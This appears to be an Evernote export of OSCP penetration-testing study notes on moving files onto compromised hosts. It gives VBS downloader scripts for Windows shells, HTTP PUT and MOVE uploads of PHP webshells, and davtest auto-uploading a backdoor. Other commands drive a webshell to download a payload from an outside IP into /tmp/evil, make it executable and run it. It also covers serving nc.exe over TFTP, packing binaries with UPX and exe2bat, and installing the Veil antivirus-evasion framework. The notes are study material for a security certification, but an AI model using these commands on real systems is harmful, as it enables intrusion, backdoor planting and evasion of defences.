<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Security"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-05 02:58:31 +0000"/><meta name="source" content="desktop.win"/><meta name="source-application" content="evernote.win32"/><meta name="source-url" content="https://raw.githubusercontent.com/erik1o6/oscp/master/wget-vbs-win.txt"/><meta name="updated" content="2018-01-05 04:33:38 +0000"/><title>File Transfer</title></head><body><div><font style="font-size: 14pt;"><u>Simple Local Web Servers</u></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><ul><li><font style="font-size: 12pt;">Run a basic http server, great for serving up shells etc&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>python -m SimpleHTTPServer 80</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Run a basic Python3 http server, great for serving up shells etc&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>python3 -m http.server</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Run a ruby webrick basic http server&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>ruby -r webrick -e "s = WEBrick::HTTPServer.new(:Port =&gt; 8000, :DocumentRoot =&gt; Dir.pwd); trap('INT') { s.shutdown }; s.start"</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Run a basic PHP http server</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>php -S $ip:80</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Creating a wget VB Script on Windows:&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>copy this script on a windows computer to install wget in visualbasic scripting language</div><div>dont forget to start the apache2 server attack</div><div>service apache2 start</div><div>#######################################################</div><div>######################################################</div><div>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</div><div>echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</div><div>echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</div><div>echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</div><div>echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</div><div>echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</div><div>echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs</div><div>echo Err.Clear &gt;&gt; wget.vbs</div><div>echo Set http = Nothing &gt;&gt; wget.vbs</div><div>echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs</div><div>echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs</div><div>echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs</div><div>echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs</div><div>echo http.Open "GET", strURL, False &gt;&gt; wget.vbs</div><div>echo http.Send &gt;&gt; wget.vbs</div><div>echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</div><div>echo Set http = Nothing &gt;&gt; wget.vbs</div><div>echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs</div><div>echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs</div><div>echo strData = "" &gt;&gt; wget.vbs</div><div>echo strBuffer = "" &gt;&gt; wget.vbs</div><div>echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</div><div>echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs</div><div>echo Next &gt;&gt; wget.vbs</div><div>echo ts.Close &gt;&gt; wget.vbs</div><div><br/></div><div>####################################################################</div><div>####################################################################</div><div>to use simply type</div><div>cscript wget.vbs http://192.168.14.220/evidence.txt evidence.txt</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Windows file transfer script that can be pasted to the command line.</font><br/></li></ul></div><div>File transfers to a Windows machine can be tricky without a Meterpreter shell.&nbsp;&nbsp;&nbsp;&nbsp;The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>echo Set args = Wscript.Arguments&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo Url = "http://1.1.1.1/windows-privesc-check2.exe"&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo dim bStrm: Set bStrm = createobject("Adodb.Stream")&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo xHttp.Open "GET", Url, False&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo xHttp.Send&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo with bStrm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.type = 1 '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.write xHttp.responseBody&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.savetofile "C:\temp\windows-privesc-check2.exe", 2 '&nbsp;&nbsp;&nbsp;&nbsp;>> webdl.vbs</div><div>timeout 1</div><div>echo end with &gt;&gt; webdl.vbs</div><div>timeout 1</div><div>echo</div></div><div><br/></div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The file can be run using the following syntax:</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>C:\temp\cscript.exe webdl.vbs</div></div><div>&nbsp;&nbsp;</div><div><font style="font-size: 14pt;"><u>Mounting File Shares</u></font></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Mount NFS share to /mnt/nfs</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>mount $ip:/vol/share /mnt/nfs</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;"><font>HTTP Put&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>nmap -p80 $ip --script http-put --script-args</div><div>http-put.url='/test/sicpwn.php',http-put.file='/var/<a href="http://www/html/sicpwn.php">www/html/sicpwn.php</a></div></div><div><br/></div><div><font style="font-size: 14pt;"><u>Uploading Files</u></font></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">SCP</font></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2</div><div>scp localfile username@$ip:~/Folder/<br/></div><div>scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~<br/></div></div><div>Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>davtest -move -sendbd auto -url http://$ip</div><div><a href="https://github.com/cldrn/davtest" style="font-family: Monaco; font-size: 9pt; color: rgb(51, 51, 51);">https://github.com/cldrn/davtest</a></div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">You can also upload a file using the PUT method with the curl command:</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>curl -T 'leetshellz.txt' 'http://$ip'</div></div><div><br/></div><div><font style="font-size: 12pt;">And rename it to an executable file using the MOVE method with the curl command:</font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Upload shell using limited php shell cmd. U</font><span style="font-size: 12pt;">se the webshell to download and execute the meterpreter&nbsp;&nbsp;&nbsp;&nbsp;</span><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>\[curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O</div><div>/tmp/evil" http://$ip/files/sh.php&nbsp;&nbsp;&nbsp;&nbsp;</div><div>\[curl -s --data "cmd=chmod 777 /tmp/evil"</div><div>http://$ip/files/sh.php&nbsp;&nbsp;&nbsp;&nbsp;</div><div>curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">TFTP&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>mkdir /tftp&nbsp;&nbsp;&nbsp;&nbsp;</div><div>atftpd --daemon --port 69 /tftp&nbsp;&nbsp;&nbsp;&nbsp;</div><div>cp /usr/share/windows-binaries/nc.exe /tftp/&nbsp;&nbsp;&nbsp;&nbsp;</div><div><br/></div><div>EX. FROM WINDOWS HOST:&nbsp;&nbsp;&nbsp;&nbsp;</div><div>C:\\Users\\Offsec&gt;tftp -i $ip get nc.exe</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">FTP&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>apt-get update && apt-get install pure-ftpd&nbsp;&nbsp;&nbsp;&nbsp;</div><div><br/></div><div>\#!/bin/bash&nbsp;&nbsp;&nbsp;&nbsp;<br/></div><div>groupadd ftpgroup&nbsp;&nbsp;&nbsp;&nbsp;</div><div>useradd -g ftpgroup -d /dev/null -s /etc ftpuser&nbsp;&nbsp;&nbsp;&nbsp;</div><div>pure-pw useradd offsec -u ftpuser -d /ftphome&nbsp;&nbsp;&nbsp;&nbsp;</div><div>pure-pw mkdb&nbsp;&nbsp;&nbsp;&nbsp;</div><div>cd /etc/pure-ftpd/auth/&nbsp;&nbsp;&nbsp;&nbsp;</div><div>ln -s ../conf/PureDB 60pdb&nbsp;&nbsp;&nbsp;&nbsp;</div><div>mkdir -p /ftphome&nbsp;&nbsp;&nbsp;&nbsp;</div><div>chown -R ftpuser:ftpgroup /ftphome/&nbsp;&nbsp;&nbsp;&nbsp;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div><div>/etc/init.d/pure-ftpd restart</div></div><div><br/></div><div><font style="font-size: 14pt;"><u>Packing Files</u></font></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Ultimate Packer for eXecutables&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>upx -9 nc.exe</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">exe2bat - Converts EXE to a text file that can be copied and pasted&nbsp;&nbsp;&nbsp;&nbsp;</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>locate exe2bat&nbsp;&nbsp;&nbsp;&nbsp;</div><div>wine exe2bat.exe nc.exe nc.txt</div></div><div><br/></div><div><ul><li><font style="font-size: 12pt;">Veil - Evasion Framework</font><br/></li></ul></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><a href="https://github.com/Veil-Framework/Veil-Evasion"><font color="#000000">https://github.com/Veil-Framework/Veil-Evasion</font></a></div><div><font style="color: rgb(0, 0, 0);">apt-get -y install git&nbsp;&nbsp;&nbsp;&nbsp;</font></div><div><font color="#000000">git clone <a href="https://github.com/Veil-Framework/Veil-Evasion.git" style="color: rgb(0, 0, 0);">https://github.com/Veil-Framework/Veil-Evasion.git</a></font></div><div><font color="#000000">cd Veil-Evasion/&nbsp;&nbsp;&nbsp;&nbsp;</font></div><div><font color="#000000">cd setup&nbsp;&nbsp;&nbsp;&nbsp;</font></div><div><font color="#000000">setup.sh -c</font></div></div><div><br/></div></body></html>